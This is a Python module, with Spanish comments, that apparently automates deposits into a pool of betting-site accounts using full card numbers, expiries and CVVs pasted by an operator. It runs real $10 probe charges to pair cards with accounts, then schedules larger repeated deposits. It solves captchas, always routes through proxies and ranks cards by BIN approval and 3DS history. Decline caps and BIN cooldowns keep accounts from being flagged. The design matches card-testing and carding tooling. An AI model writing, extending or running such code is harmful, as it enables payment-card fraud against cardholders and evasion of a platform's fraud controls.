# auto_deposit.py
"""Motor de selección del modo auto de depósito (Task B).

Funciones puras de selección de cuentas/tarjetas + planner que toca la BD.
Los imports de módulos del repo (deposits, jwt_keeper, account_refresh, app)
son SIEMPRE lazy dentro de función — patrón del repo para evitar imports
circulares (app → auto_deposit → deposits → app).

La lógica de filtros de `select_accounts_for_auto` replica
`jwt_keeper.select_refresh_candidates` (jwt_keeper.py:75-129) con tweaks
para depósito: exige JWT VIVO (> now + 60, no por expirar) y cap 24h
suficiente para amount × count.
"""

import time
from datetime import datetime, timedelta, timezone
from typing import Any, Awaitable, Callable, Dict, List, Optional

THREEDS_RECENT_H = 24  # 3DS en las últimas N horas → BIN penalizado


# ── helpers internos ─────────────────────────────────────────────────────────
def _now_epoch() -> int:
    return int(time.time())


def _grade_rank(grade: Any) -> int:
    from jwt_keeper import _GRADE_RANK

    return _GRADE_RANK.get(grade or "", 9)


def _sa_tokens() -> set:
    """Tokens que identifican al SA en locked_by (excepción RESERVADA_SA).

    Lazy + defensivo: las funciones puras deben seguir siendo puras aunque
    account_refresh no sea importable en el contexto del caller.
    """
    try:
        from account_refresh import _sa_lock_tokens

        return {str(t).lower() for t in (_sa_lock_tokens() or [])}
    except Exception:
        return set()


def _cd_active(cd: Any, now: int) -> bool:
    """cooldown_until (epoch) activo, vía deposits._cooldown_active.

    Fallback a la semántica epoch de jwt_keeper si la firma no acepta el
    valor crudo (no enmascara otros errores — solo TypeError/AttributeError).
    """
    if cd in (None, ""):
        return False
    try:
        import deposits as dep

        return bool(dep._cooldown_active(cd))
    except (TypeError, AttributeError):
        try:
            return int(cd) > now
        except (TypeError, ValueError):
            return False


def _exp_int(v: Any) -> int:
    if v in (None, ""):
        return 0
    try:
        return int(v)
    except (TypeError, ValueError):
        return 0


def _bin_of(card: Dict[str, Any]) -> str:
    # BIN = card_number[:6] (deposits.py:236)
    return str(card.get("card_number") or "")[:6]


def _approval_rate(stats: Optional[Dict[str, Any]]) -> float:
    """approval_rate COMPUTADO (total_approved/total_attempts) — NO es columna."""
    stats = stats or {}
    att = stats.get("total_attempts") or 0
    if not att:
        return 0.0
    return (stats.get("total_approved") or 0) / att


def _threeds_recent(stats: Optional[Dict[str, Any]]) -> bool:
    """True si el BIN tuvo 3DS en las últimas THREEDS_RECENT_H horas."""
    stats = stats or {}
    if not (stats.get("total_3ds") or 0):
        return False
    last = stats.get("last_3ds_at")
    if not last:
        return False
    try:
        dt = datetime.fromisoformat(str(last).replace(" ", "T").replace("Z", "+00:00"))
    except ValueError:
        return False
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    return datetime.now(timezone.utc) - dt < timedelta(hours=THREEDS_RECENT_H)


def _rank_key(card: Dict[str, Any], bin_stats_map: Dict[str, Any]):
    """Peor primero si 3DS reciente; luego mejor approval_rate primero."""
    st = (bin_stats_map or {}).get(_bin_of(card)) or {}
    return (1 if _threeds_recent(st) else 0, -_approval_rate(st))


def _pipe_str(card: Dict[str, Any]) -> str:
    return "{}|{}|{}".format(
        card.get("card_number") or "",
        card.get("card_expiry") or "",
        card.get("card_cvv") or "",
    )


def _parse_card_pipe(p: str) -> Optional[Dict[str, Any]]:
    parts = [part.strip() for part in str(p).split("|") if part.strip()]
    if not parts or not parts[0]:
        return None
    if len(parts) == 3:
        return {
            "card_number": parts[0],
            "card_expiry": parts[1],
            "card_cvv": parts[2],
        }
    if len(parts) == 4:
        mm = parts[1]
        yy = parts[2]
        cvv = parts[3]
        if len(yy) == 4:
            yy = yy[-2:]
        return {
            "card_number": parts[0],
            "card_expiry": f"{mm}{yy}",
            "card_cvv": cvv,
        }
    return None


def _normalize_pipe_to_3part(p: str) -> str:
    c = _parse_card_pipe(p)
    return _pipe_str(c) if c else p


# ── B1 — selección de cuentas (pura) ─────────────────────────────────────────
MM_ACCOUNT_RECENT_DECLINE_LIMIT = (
    2  # >= N declines en 12h → cuenta fuera de selección (Robert 2026-07-28)
)


def select_accounts_for_auto(
    rows: List[Dict[str, Any]],
    amount: float,
    count: int,
    window_map: Dict[str, Dict[str, Any]],
    decline_map: Optional[Dict[str, int]] = None,
    meta_map: Optional[Dict[str, Dict[str, Any]]] = None,
) -> List[Dict[str, Any]]:
    """Filtra + clasifica internamente (Top, Mid, Low) + limita cuentas candidatas al depósito auto.

    Filtros de Exclusión Dura:
      1. status == 'LIVE'
      2. published_to_pool == 1 (o excepción RESERVADA_SA)
      3. locked_by IS NULL
      4. cooldown_until no activo
      5. Cooldown de 48h por depósito APROBADO en el dashboard
      6. window_map[email]["available"] >= amount * count
      7. decline_map[email] < MM_ACCOUNT_RECENT_DECLINE_LIMIT (2 declines en 12h)
      8. Cero IsUserInValidationProcess o DEAD reciente en meta_map

    Estratificación Oculta Backend (sin badges ni labels visuales):
      - Tier TOP: 3DS reciente (<24h) o Grade A+
      - Tier MID: Grade A
      - Tier LOW: Depósitos SPEI/externos recientes (<24h), reposo corto o Grade B/C/D

    JWT vivo NO es exclusión dura (Robert 2026-08-05): el matchmaker PRIORIZA
    cuentas con sesión 🟢 por rapidez, pero si no hay suficientes, toma 🔑 sin
    JWT y el flujo hace Login Full — última prioridad, no bloquea. Las cuentas
    sin JWT vivo caen siempre al tier más bajo.

    Selección: 1 TOP, 1 MID, 1 LOW (round-robin con fall-through).
    """
    now = _now_epoch()
    sa = _sa_tokens()
    out: List[Dict[str, Any]] = []
    meta_map = meta_map or {}

    for r in rows:
        email = r.get("email")
        if (r.get("status") or "") != "LIVE":
            continue

        locked_by = r.get("locked_by")
        # RESERVADA_SA (pool=0 + locked_by del SA) → candidata.
        is_sa_reserved = not r.get("published_to_pool") and str(locked_by).lower() in sa
        if not is_sa_reserved:
            if not r.get("published_to_pool"):
                continue
            if locked_by is not None:
                continue

        if _cd_active(r.get("cooldown_until"), now):
            continue

        meta = meta_map.get(email) or {}
        # 1. Enfriamiento 48h por depósito APROBADO en dashboard
        if meta.get("has_dashboard_approved_48h"):
            continue

        # 2. Errores de validación o DEAD
        if meta.get("is_validation_blocked") or meta.get("is_dead_blocked"):
            continue

        win = (window_map or {}).get(email) or {}
        avail = win.get("available")
        if avail is not None and float(avail) < amount * count:
            continue

        if decline_map is not None:
            if (decline_map.get(email) or 0) >= MM_ACCOUNT_RECENT_DECLINE_LIMIT:
                continue

        # JWT vivo (🟢) = sesión reutilizable sin captcha. NO excluye (Robert
        # 2026-08-05): baja a la cuenta de tier, no la saca. Flag para el tiering.
        if "jwt_expires_at" in r:
            r["_jwt_alive"] = _exp_int(r.get("jwt_expires_at")) > now + 60
        else:
            r["_jwt_alive"] = False

        out.append(r)

    # Clasificar internamente en 3 Tiers (Top, Mid, Low)
    tier_top: List[Dict[str, Any]] = []
    tier_mid: List[Dict[str, Any]] = []
    tier_low: List[Dict[str, Any]] = []

    for r in out:
        email = r.get("email")
        meta = meta_map.get(email) or {}

        # Sin JWT vivo (🔑) → SIEMPRE último tier (Robert 2026-08-05): el
        # matchmaker prioriza 🟢 por rapidez; 🔑 solo se usa si no alcanza y
        # el flujo hace Login Full. No se excluye (última prioridad, no bloquea).
        if not r.get("_jwt_alive"):
            tier_low.append(r)
            continue

        has_spei_24h = meta.get("has_spei_24h", False)
        has_3ds_24h = meta.get("has_3ds_24h", False)
        total_fails = meta.get("total_fails", 0)
        mins_since_attempt = meta.get("mins_since_last_attempt", 99999)
        grade = r.get("grade") or ""

        if has_spei_24h:
            tier_low.append(r)
        elif has_3ds_24h:
            tier_top.append(r)
        elif mins_since_attempt <= 1440:
            tier_low.append(r)
        elif meta:
            if grade == "A+":
                tier_top.append(r)
            else:
                tier_mid.append(r)
        else:
            if grade == "A+":
                tier_top.append(r)
            elif grade == "A":
                tier_mid.append(r)
            else:
                tier_low.append(r)

    sort_key = lambda r: (
        _grade_rank(r.get("grade")),
        -(float(r.get("grade_score") or 0)),
    )
    tier_top.sort(key=sort_key)
    tier_mid.sort(key=sort_key)
    # LOW mezcla dos perfiles de riesgo distinto: cuentas JWT-vivo degradadas
    # (SPEI reciente / intento <24h / grade B-D — buena cuenta, solo con mala
    # suerte temporal) y cuentas 🔑 sin JWT (necesitan Login Full: captcha +
    # proxy + una superficie de fallo extra ANTES de llegar siquiera al probe).
    # Robert 2026-08-05: preferencia leve, no exclusión — dentro de LOW, probar
    # primero las 🟢 (más baratas, mismo riesgo de tarjeta) y dejar las 🔑 para
    # cuando ya no queden alternativas vivas en este tier. No cambia CUÁLES
    # cuentas entran (siguen todas, round-robin intacto), solo el ORDEN dentro
    # del tier — no le quita presupuesto de captcha a la búsqueda del match.
    tier_low.sort(key=lambda r: (0 if r.get("_jwt_alive") else 1, *sort_key(r)))

    # Si count <= 3 o hay muy pocas cuentas, entregar las mejores disponibles (TOP -> MID -> LOW)
    if count <= 3:
        combined = tier_top + tier_mid + tier_low
        return combined[:count]

    # Distribución intercalada (1 TOP, 1 MID, 1 LOW)
    stratified: List[Dict[str, Any]] = []
    i_top, i_mid, i_low = 0, 0, 0

    while len(stratified) < count and (
        i_top < len(tier_top) or i_mid < len(tier_mid) or i_low < len(tier_low)
    ):
        # 1 TOP
        if i_top < len(tier_top):
            stratified.append(tier_top[i_top])
            i_top += 1
            if len(stratified) == count:
                break

        # 1 MID
        if i_mid < len(tier_mid):
            stratified.append(tier_mid[i_mid])
            i_mid += 1
            if len(stratified) == count:
                break

        # 1 LOW
        if i_low < len(tier_low):
            stratified.append(tier_low[i_low])
            i_low += 1
            if len(stratified) == count:
                break

    # Si aún falta para completar count (fall-through de seguridad)
    if len(stratified) < count:
        remaining = [r for r in out if r not in stratified]
        remaining.sort(key=sort_key)
        stratified.extend(remaining[: count - len(stratified)])

    # _jwt_alive era flag interno de tiering — limpiarlo del dict entregado
    for r in stratified:
        r.pop("_jwt_alive", None)

    return stratified


# ── B3 — planner (toca la BD) ────────────────────────────────────────────────
MAX_ACCOUNTS_HARD_CAP = (
    10  # Robert 2026-08-05: tope duro por corrida, sea cual sea la razón
)


def _max_accounts_for_cards(num_cards: int) -> int:
    """Robert 2026-07-28: 3 cuentas para la 1a tarjeta + 1 extra por tarjeta
    adicional — evita taladrar todo el pool para lograr el match, con rango
    suficiente cuando hay más tarjetas para probar.

    Robert 2026-08-05: tope duro de MAX_ACCOUNTS_HARD_CAP (10) — la fórmula
    de 3+1×extra es el estándar, pero NUNCA debe sumar más de 10 cuentas en
    una sola corrida, sin importar cuántas tarjetas se den."""
    return min(MAX_ACCOUNTS_HARD_CAP, 3 + max(0, num_cards - 1))


def plan_auto_mission(
    db_path,
    card_pipes: List[str],
    amount: float = 150,
    target_count: int = 9,
    max_accounts: Optional[int] = None,
) -> Dict[str, Any]:
    """Plan de misión auto: cuentas elegibles + tarjeta asignada a cada una.

    Retorna {accounts: [{id, email, grade, card_pipe}], total_estimated,
    feasible, reason}.

    - Cuentas: select_accounts_for_auto sobre `accounts` de la BD; el
      window_map se computa desde deposit_attempts con la misma semántica de
      deposits._window_status (available = max(0, DEP_MAX_24H - used 24h)).
      decline_map (Robert 2026-07-28) cuenta declines en las últimas 12h por
      cuenta — >=2 la saca de la selección (cuenta ya "quemada" reciente).
    - Tarjeta: SIEMPRE del pool de `card_pipes` que entregó el operador,
      rankeado por approval_rate computado / 3DS reciente. NUNCA se usa una
      tarjeta ya guardada/casada en la cuenta (`account_cards`) — Robert
      2026-08-05: el automático solo prueba lo que el operador dio; si
      ninguna del pool sirve para esa cuenta, la cuenta queda sin tarjeta
      (fuera del plan), no se sustituye por una married.
    - max_accounts: si no se pasa explícito, se escala con el número de
      tarjetas pegadas (`_max_accounts_for_cards`).
    - feasible = hay cuentas Y todas tienen tarjeta viable.
    """
    import sqlite3
    import deposits as dep

    if max_accounts is None:
        max_accounts = _max_accounts_for_cards(len(card_pipes or []))

    con = sqlite3.connect(str(db_path))
    con.row_factory = sqlite3.Row
    try:
        # Filtrar cuentas ineficientes: LIVE, no locked, balance >= amount, NO RATE_LIMITED
        rows = [dict(r) for r in con.execute("""
            SELECT * FROM accounts
            WHERE status = 'LIVE'
              AND (locked_until IS NULL OR locked_until <= datetime('now'))
              AND balance >= ?
              AND dead_reason NOT LIKE 'RATE_LIMITED%'
        """, (amount,)).fetchall()]
        window_map: Dict[str, Dict[str, Any]] = {}
        decline_map: Dict[str, int] = {}
        meta_map: Dict[str, Dict[str, Any]] = {}
        for r in rows:
            email = r.get("email")
            used = con.execute(
                "SELECT COALESCE(SUM(amount),0) AS s FROM deposit_attempts "
                "WHERE account_email=? AND UPPER(status)='APPROVED' "
                "AND created_at >= datetime('now','-24 hours')",
                (email,),
            ).fetchone()["s"]
            window_map[email] = {
                "available": max(0.0, float(dep.DEP_MAX_24H) - float(used or 0))
            }
            declines = con.execute(
                "SELECT COUNT(*) AS n FROM deposit_attempts "
                "WHERE account_email=? AND UPPER(status)='REJECTED' "
                "AND created_at >= datetime('now','-12 hours')",
                (email,),
            ).fetchone()["n"]
            decline_map[email] = int(declines or 0)

            # Métricas avanzadas para la fórmula de priorización multivariable
            now_dt = datetime.now(timezone.utc)

            # 1. Depósito APROBADO en el dashboard en las últimas 48h (Cooldown 48h)
            # Normalizar fechas SQLite sin formato UTC
            app_48h = con.execute(
                "SELECT COUNT(*) AS n FROM deposit_attempts "
                "WHERE account_email=? AND UPPER(status)='APPROVED' "
                "AND (julianday('now') - julianday(created_at)) <= 2.0",
                (email,),
            ).fetchone()["n"]

            # 2. Depósitos por SPEI / externos recientes (<24h) en account_transactions (gateway=2, status=6, txn_type=1)
            spei_24h = con.execute(
                "SELECT COUNT(*) AS n FROM account_transactions "
                "WHERE account_email=? AND gateway=2 AND status=6 AND txn_type=1 "
                "AND txn_date >= datetime('now','-24 hours')",
                (email,),
            ).fetchone()["n"]

            # 3. Evento 3DS_REQUIRED reciente (<24h)
            threeds_24h = con.execute(
                "SELECT COUNT(*) AS n FROM deposit_attempts "
                "WHERE account_email=? AND UPPER(status) LIKE '%3DS%' "
                "AND (julianday('now') - julianday(created_at)) <= 1.0",
                (email,),
            ).fetchone()["n"]

            # 4. Total rechazos históricos
            tot_fails = con.execute(
                "SELECT COUNT(*) AS n FROM deposit_attempts "
                "WHERE account_email=? AND UPPER(status) IN ('REJECTED', 'GATEWAY_ERROR')",
                (email,),
            ).fetchone()["n"]

            # 5. IsUserInValidationProcess o DEAD reciente
            val_blocked = con.execute(
                "SELECT COUNT(*) AS n FROM deposit_attempts "
                "WHERE account_email=? AND rejection_reason LIKE '%IsUserInValidationProcess%'",
                (email,),
            ).fetchone()["n"]

            dead_blocked = con.execute(
                "SELECT COUNT(*) AS n FROM deposit_attempts "
                "WHERE account_email=? AND (rejection_reason LIKE '%DEAD%' OR rejection_reason LIKE '%UNAUTHORIZED%')",
                (email,),
            ).fetchone()["n"]

            # 6. Historial de BINs aprobados en los últimos 30 días para esta cuenta: {bin: set(card_pipes_aprobados)}
            approved_bin_pipes: Dict[str, set] = {}
            try:
                bin_app_rows = con.execute(
                    "SELECT card_pipe FROM deposit_attempts "
                    "WHERE account_email=? AND UPPER(status)='APPROVED' AND card_pipe IS NOT NULL "
                    "AND created_at >= datetime('now','-30 days')",
                    (email,),
                ).fetchall()

                for row in bin_app_rows:
                    p_raw = str(row["card_pipe"]).strip()
                    p_norm = _normalize_pipe_to_3part(p_raw)
                    b_code = p_norm[:6] if len(p_norm) >= 6 else ""
                    if b_code:
                        if b_code not in approved_bin_pipes:
                            approved_bin_pipes[b_code] = set()
                        approved_bin_pipes[b_code].add(p_norm)
            except sqlite3.OperationalError:
                approved_bin_pipes = {}

            # Minutos desde el último intento/movimiento
            last_att = con.execute(
                "SELECT created_at FROM deposit_attempts "
                "WHERE account_email=? ORDER BY created_at DESC LIMIT 1",
                (email,),
            ).fetchone()
            mins_since = 99999
            if last_att and last_att["created_at"]:
                try:
                    dt = datetime.fromisoformat(
                        str(last_att["created_at"])
                        .replace(" ", "T")
                        .replace("Z", "+00:00")
                    )
                    if dt.tzinfo is None:
                        dt = dt.replace(tzinfo=timezone.utc)
                    mins_since = int((now_dt - dt).total_seconds() / 60.0)
                except Exception:
                    pass

            meta_map[email] = {
                "has_dashboard_approved_48h": bool(app_48h),
                "has_spei_24h": bool(spei_24h),
                "has_3ds_24h": bool(threeds_24h),
                "total_fails": int(tot_fails or 0),
                "is_validation_blocked": bool(val_blocked),
                "is_dead_blocked": bool(dead_blocked),
                "approved_bin_pipes": approved_bin_pipes,
                "mins_since_last_attempt": mins_since,
            }

        try:
            bin_stats_map = {
                str(s["bin"]): dict(s)
                for s in con.execute("SELECT * FROM bin_stats").fetchall()
            }
        except sqlite3.OperationalError:
            bin_stats_map = {}

        selected = select_accounts_for_auto(
            rows,
            amount,
            target_count,
            window_map,
            decline_map=decline_map,
            meta_map=meta_map,
        )[:max_accounts]

        pool: List[Dict[str, Any]] = []
        for p in card_pipes or []:
            c = _parse_card_pipe(p)
            if c:
                pool.append(c)
        pool.sort(key=lambda c: _rank_key(c, bin_stats_map))

        accounts_out: List[Dict[str, Any]] = []
        for r in selected:
            email = r.get("email")
            meta = meta_map.get(email) or {}
            app_bin_pipes = meta.get("approved_bin_pipes") or {}

            # Asignar la mejor tarjeta candidata del pool (dado por el operador)
            # que no viole el cooldown de 30d de BIN. NUNCA se consulta
            # account_cards aquí — Robert 2026-08-05: el automático no usa
            # tarjetas ya guardadas en la cuenta, solo el pool entregado.
            pipe = None
            if pool:
                for cand in pool:
                    cand_pipe_str = _pipe_str(cand)
                    cand_bin = cand_pipe_str[:6] if len(cand_pipe_str) >= 6 else ""
                    # Cooldown 30d del BIN: Si el BIN aprobó con OTRO pipe en los últimos 30d en esta cuenta -> omitir
                    if cand_bin in app_bin_pipes:
                        if cand_pipe_str not in app_bin_pipes[cand_bin]:
                            continue  # Mismo BIN pero otra tarjeta -> bloquear por 30 días

                    pipe = cand_pipe_str
                    break

            if pipe:
                accounts_out.append(
                    {
                        "id": r.get("id"),
                        "email": email,
                        "grade": r.get("grade"),
                        "card_pipe": pipe,
                    }
                )
    finally:
        con.close()

    feasible = bool(accounts_out) and all(a["card_pipe"] for a in accounts_out)
    if feasible:
        reason = ""
    elif not accounts_out:
        reason = "sin cuentas elegibles"
    else:
        reason = "cuentas sin tarjeta viable"
    return {
        "accounts": accounts_out,
        "total_estimated": amount * target_count * len(accounts_out),
        "feasible": feasible,
        "reason": reason,
    }


# ════════════════════════════════════════════════════════════════════════════
# Task D — Orquestador de misión auto (matchmaking probe $10 + scheduled 9×$150)
#
# Reglas duras (plan v2, auditado por Claude):
#  1. Siempre r.get("jwt")/r.get("used_proxy") — returns tempranos no las traen.
#  2. Match sin JWT → Fase 2 arranca con session_jwt=None y captura en su 1er éxito.
#  3. Totales incrementales en auto_missions tras CADA intento (anti-zombie).
#  4. Cancel cooperativo: chequeo de status en BD entre iteraciones → unlock + salir.
#  5. 1 slot de _mission_sem para TODA la misión (cuentas secuenciales). Fail-fast.
#  6. NUNCA proxyless (lo garantiza _run_deposit_with_phases internamente).
#  7. Lock SOLO antes del 1er intento con tarjeta candidata; unlock si ninguna jala
#     y al cerrar la misión (el lock SA es perpetuo — no dejar cuentas reservadas).
#  8. _record_attempt tras CADA intento (patrón scheduled deposits.py:2486-2492).
#  9. Captcha pool vía _load_deps; stop cuando nadie más necesita login.
# 10. Imports cross-módulo SIEMPRE lazy dentro de función.
# 11. Reuso de sesión entre tarjetas de la MISMA cuenta (_mm_session_* :1782-1798).
# ════════════════════════════════════════════════════════════════════════════
import asyncio
import json
import logging
import os
import random
import uuid

logger = logging.getLogger("betmexico.dashboard.auto_deposit")

PROBE_AMOUNT = 10.0  # D1: probe de matchmaking (dinero real, queda en la cuenta)
MATCH_TRANSIENT_RETRIES = 4  # = MM_MAX_PAIR_TRANSIENT (nuestro lado, no quema tarjeta)

# Regla Robert 2026-07-28 (anti-rafagueo):
#  - MISMA cuenta, otra tarjeta: esperar dep.MM_COOLDOWN (60s) antes de reintentar.
#  - Cuenta DISTINTA: basta un respiro de MM_CROSS_ACCOUNT_GAP (5s).
#  - Tope de declines reales por cuenta EN ESTA CORRIDA antes de abandonarla
#    (independiente del límite histórico de 12h aplicado en la selección).
MM_CROSS_ACCOUNT_GAP = 5
MM_MAX_ACCOUNT_DECLINES_PER_RUN = 2


def _fake_progress_pct(status: str, extra: dict) -> int:
    """Única fuente de verdad para el % de progreso fake de la misión.

    Consumida por bot (telegram_bot_mock/bot.py::on_progress) y portal
    (static/portal.js via SSE fake_pct). Replica EXACTAMENTE los breakpoints
    que portal.js calculaba en JS (líneas 226-264 pre-refactor):
    - matching: 15%
    - logging_in: 15 + (current/total)*30, cap 70
    - match: 25 + matches_count*15, cap 85
    - preparing: 30% (piso de Fase 2 antes del primer depósito)
    - scheduling: 30 + (completed/total)*70, cap 95
    - completed: 100
    """
    if status == "matching":
        return 15
    if status == "logging_in":
        cur = extra.get("current", 1)
        tot = extra.get("total", 1)
        return min(70, 15 + int((cur / max(tot, 1)) * 30))
    if status == "match":
        count = extra.get("matches_count", 0)
        return min(85, 25 + count * 15)
    if status == "preparing":
        return 30
    if status == "scheduling":
        comp = extra.get("completed", 0)
        tot = extra.get("total", 9)
        pct = 30 + int((comp / max(tot, 1)) * 70)
        return min(95, pct)
    if status == "completed":
        return 100
    return 0


# ── seams de BD/app (los tests los monkeypatchean; producción usa app.db) ─────
def _iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _m_load(mission_id: str) -> Optional[Dict[str, Any]]:
    """Fila de la misión (amount, target_count, card_pipes, status)."""
    from app import db

    with db() as c:
        row = c.execute(
            "SELECT * FROM auto_missions WHERE mission_id=?", (mission_id,)
        ).fetchone()
    return dict(row) if row else None


def _m_status(mission_id: str) -> Optional[str]:
    m = _m_load(mission_id)
    return m.get("status") if m else None


def _m_update(mission_id: str, **fields) -> None:
    """UPDATE incremental — SIEMPRE toca updated_at (regla 3, anti-zombie)."""
    from app import db

    fields["updated_at"] = _iso()
    cols = ", ".join(f"{k}=?" for k in fields)
    with db(write=True) as c:
        c.execute(
            f"UPDATE auto_missions SET {cols} WHERE mission_id=?",
            (*fields.values(), mission_id),
        )


def _fetch_account(account_id: int) -> Optional[Dict[str, Any]]:
    from app import db

    with db() as c:
        row = c.execute(
            "SELECT id, email, password FROM accounts WHERE id=?", (account_id,)
        ).fetchone()
    return dict(row) if row else None


def _unlock(account_id: int) -> None:
    """Unlock explícito (reglas 4 y 7). El lock SA es perpetuo (locked_until NULL)
    — sin esto la cuenta queda RESERVADA_SA para siempre tras la misión."""
    from app import db

    with db(write=True) as c:
        c.execute(
            "UPDATE accounts SET locked_by=NULL, locked_until=NULL WHERE id=?",
            (account_id,),
        )


def _broadcast_mission(
    mission_id: str,
    status: str,
    user: dict,
    on_progress: Optional[Callable[[str, dict], None]] = None,
    **extra,
) -> None:
    from app import _broadcast, _resolve_who

    try:
        _broadcast(
            {
                "type": "activity",
                "kind": "auto_mission",
                "mission_id": mission_id,
                "status": status,
                "ts": _iso(),
                "fake_pct": _fake_progress_pct(status, extra),
                **_resolve_who(user.get("telegram_id")),
                **extra,
            }
        )
    except Exception as e:
        logger.warning(f"[Auto {mission_id}] broadcast falló ({status}): {e}")
    if on_progress:
        try:
            extra["fake_pct"] = _fake_progress_pct(status, extra)
            on_progress(status, extra)
        except Exception as e:
            logger.warning(f"[Auto {mission_id}] on_progress falló ({status}): {e}")


async def _stop_pool(pool, mission_id: str) -> None:
    if pool is None:
        return
    try:
        await pool.stop()
        logger.info(f"[Auto {mission_id}] captcha pool detenido")
    except Exception as e:
        logger.warning(f"[Auto {mission_id}] no pude detener pool: {e}")


# ── orquestador ──────────────────────────────────────────────────────────────
async def run_auto_mission(
    mission_id: str,
    plan: Dict[str, Any],
    user: dict,
    on_progress: Optional[Callable[[str, dict], None]] = None,
    confirm_gate: Optional[Callable[[dict], Awaitable[bool]]] = None,
) -> None:
    """Orquesta Fase 1 (matchmaking probe $10) + Fase 2 (scheduled N×amount/60s)
    + Fase 3 (cierre). Lee amount/target_count/card_pipes de la fila de la misión
    (self-sufficient: no depende del shape exacto de `plan`)."""
    import deposits as dep

    operator_id = user.get("telegram_id")

    # Regla 5: fail-fast si el semáforo está lleno (el endpoint ya devolvió 429,
    # pero la misión pudo encolarse antes de que se llenara).
    if dep._mission_sem.locked():
        _m_update(
            mission_id,
            status="failed",
            phase_detail="misiones activas — semáforo lleno",
            completed_at=_iso(),
        )
        return

    async with dep._mission_sem:
        make_pool = dep._load_deps()
        if make_pool is None:
            _m_update(
                mission_id,
                status="failed",
                phase_detail="módulo de depósitos no disponible",
                completed_at=_iso(),
            )
            return
        mission = _m_load(mission_id) or {}
        amount = float(mission.get("amount") or 150)
        target_count = int(mission.get("target_count") or 9)
        try:
            card_pipes = json.loads(mission.get("card_pipes") or "[]")
            # Filtrar tarjetas ya procesadas (fallidas/declinadas en las últimas 24h)
            if card_pipes:
                from app import DB_PATH
                con = sqlite3.connect(str(DB_PATH))
                failed_cards = set(r[0] for r in con.execute("""
                    SELECT DISTINCT card_pipe FROM deposit_attempts
                    WHERE card_pipe IN ({seq})
                      AND status = 'rejected'
                      AND created_at >= datetime('now', '-24 hours')
                """.format(seq=','.join(['?']*len(card_pipes))), card_pipes).fetchall())
                con.close()
                card_pipes = [p for p in card_pipes if p not in failed_cards]
        except Exception:
            card_pipes = []

        cap_key = os.environ.get("CAPMONSTER_KEY", "") or os.environ.get(
            "BMX_CAPMONSTER_KEY", ""
        )
        pool = make_pool(cap_key, size=2, workers=1)
        await pool.start_factory()
        asyncio.create_task(pool.prefetch(2))

        sessions: Dict[str, Any] = {}  # email -> (jwt, proxy) — regla 11
        matches: List[Dict[str, Any]] = []
        locked_ids: set = set()
        deposited = 0.0
        approved = 0
        failed = 0
        cancelled = False

        def _cancelled() -> bool:
            return _m_status(mission_id) == "cancelled"

        async def _attempt(email, password, pipe, amt, sj, sp):
            """Un intento de depósito + persistencia (regla 8). Retorna (r, ok, code)."""
            import deposits as _d

            num, exp, cvv = _d._parse_pipe(pipe)
            t0 = asyncio.get_event_loop().time()
            if sj:
                logger.info(f"🔑 LOGIN OK (Sesión reusada) | {email}")
            else:
                logger.info(f"🔑 LOGIN START | {email}")
            r = await _d._run_deposit_with_phases(
                email,
                password,
                num,
                exp,
                cvv,
                amt,
                user,
                pool,
                None,
                session_jwt=sj,
                session_proxy=sp,
                persist_login_data=(sj is None),
            )
            ok = bool(r.get("success"))
            code = r.get("result_code", "UNKNOWN")
            reason = r.get("error") or code
            duration = r.get("duration_ms") or int(
                (asyncio.get_event_loop().time() - t0) * 1000
            )

            if ok:
                logger.info(
                    f"💳 SUBMIT SUCCESS | {email} | Pipe: {pipe} | Code: {code} | Duration: {duration}ms"
                )
            else:
                if code == "RATE_LIMITED":
                    # Robert 2026-08-05: el rate-limit es pedo interno del backend,
                    # se resuelve en silencio (cooldown en deposits). El operador
                    # no debe verlo en el log de misión.
                    logger.debug(f"🛡️ cuenta en pausa (retry automático) | {email}")
                elif code in _d.MM_DEAD_RC:
                    logger.error(
                        f"💀 DEAD ACCOUNT | {email} | Pipe: {pipe} | Code: {code}"
                    )
                else:
                    logger.warning(
                        f"💳 SUBMIT REJECTED | {email} | Pipe: {pipe} | Code: {code} | Reason: {reason}"
                    )

            _d._record_attempt(
                uuid.uuid4().hex,
                email,
                amt,
                _d.classify_deposit_status(code, ok),
                reason,
                duration,
                operator_id,
                card_pipe=pipe,
            )
            return r, ok, code

        try:
            # ── FASE 1 — MATCHMAKING (probe $10 real, D1) ────────────────────
            _m_update(
                mission_id,
                status="matching",
                phase_detail="buscando pares cuenta×tarjeta",
            )
            _broadcast_mission(
                mission_id,
                "matching",
                user,
                on_progress=on_progress,
                accounts=len(plan.get("accounts", [])),
            )
            accounts_list = plan.get("accounts", [])
            for acc_idx, acc in enumerate(accounts_list):
                if _cancelled():
                    cancelled = True
                    break
                account_id, email = acc.get("id"), acc.get("email")
                acct = _fetch_account(account_id)
                if not acct:
                    continue

                # Emitir evento SSE de feedback: obteniendo datos/sesión de la cuenta
                _broadcast_mission(
                    mission_id,
                    "logging_in",
                    user,
                    on_progress=on_progress,
                    email=email,
                    current=acc_idx + 1,
                    total=len(accounts_list),
                )

                # Tarjetas candidatas: la asignada por el plan (mejor del pool para
                # esta cuenta) + resto del pool — SIEMPRE del lote que dio el
                # operador, nunca de account_cards (regla 7: si no hay ninguna,
                # siguiente cuenta SIN lockear)
                candidates = [p for p in [acc.get("card_pipe"), *card_pipes] if p]
                candidates = [_normalize_pipe_to_3part(p) for p in candidates]
                candidates = list(dict.fromkeys(candidates))  # dedup, orden estable
                if not candidates:
                    continue
                matched = False
                locked = False
                code = None
                account_declines = (
                    0  # regla Robert 2026-07-28: tope por cuenta EN ESTA CORRIDA
                )
                for pipe_idx, pipe in enumerate(candidates):
                    if matched or _cancelled():
                        break
                    if account_declines >= MM_MAX_ACCOUNT_DECLINES_PER_RUN:
                        break  # ya declinó 2 veces esta corrida — no taladrar más, siguiente cuenta
                    if not locked:  # regla 7: lock justo antes del 1er intento real
                        dep._auto_lock_for_deposit(
                            account_id, operator_id, user, hours=4
                        )
                        locked = True
                        locked_ids.add(account_id)
                    transient = 0
                    while True:  # reintentos transitorios del PAR (nuestro lado)
                        sj, sp = dep._mm_session_get(sessions, email)
                        logger.info(
                            f"🏦 BEGIN_DEPOSIT | {email} | Target Pipe: {pipe} | Amt: ${PROBE_AMOUNT}"
                        )
                        r, ok, code = await _attempt(
                            email, acct["password"], pipe, PROBE_AMOUNT, sj, sp
                        )
                        dep._mm_session_update(sessions, email, r)  # regla 11
                        if ok:
                            matched = True
                            deposited += PROBE_AMOUNT
                            approved += 1
                            logger.info(f"🎯 MATCH FOUND | {email} x {pipe}")

